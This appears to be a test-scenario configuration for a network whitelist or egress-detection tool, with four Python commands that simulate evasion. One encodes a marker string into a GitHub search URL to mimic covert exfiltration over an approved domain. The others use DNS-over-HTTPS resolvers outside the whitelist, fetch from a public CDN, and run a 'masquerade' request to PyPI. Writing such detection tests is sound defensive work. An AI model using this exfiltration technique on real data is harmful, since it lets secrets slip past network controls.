notes: These scenarios are tuned for Ubuntu Lima local testing first. Promote to CI only after local stability criteria are met.

scenarios.description: Simulate covert payload transfer over a likely approved GitHub domain/path.
scenarios.command:
python3 - <<'PY'
import base64, requests
payload = base64.urlsafe_b64encode(b'EDAMAME_ALLOWED_DOMAIN_EXFIL_SIMULATION').decode()
url = f'https://github.com/search?q={payload}&type=code'
print('request=', url)
resp = requests.get(url, timeout=20)
print('status=', resp.status_code)
PY

scenarios.description: Use direct DNS-over-HTTPS requests to resolvers absent from the custom whitelist.
scenarios.command:
python3 - <<'PY'
import requests
targets = [
  'https://dns.google/resolve?name=example.com&type=A',
  'https://cloudflare-dns.com/dns-query?name=example.com&type=A'
]
for t in targets:
  h = {'accept': 'application/dns-json'}
  print('request=', t)
  r = requests.get(t, headers=h, timeout=20)
  print('status=', r.status_code)
PY

scenarios.description: Access payload over public CDN endpoint not present in baseline custom whitelist.
scenarios.command:
python3 - <<'PY'
import requests
url = 'https://cdn.jsdelivr.net/gh/jquery/jquery@3.7.1/README.md'
print('request=', url)
r = requests.get(url, timeout=20)
print('status=', r.status_code)
print('bytes=', len(r.text))
PY

scenarios.description: Same destination reached by different process identities to validate process-aware whitelist behavior.
scenarios.command:
python3 - <<'PY'
import requests
url = 'https://pypi.org/pypi/requests/json'
print('masquerade_request=', url)
r = requests.get(url, timeout=20)
print('status=', r.status_code)
PY
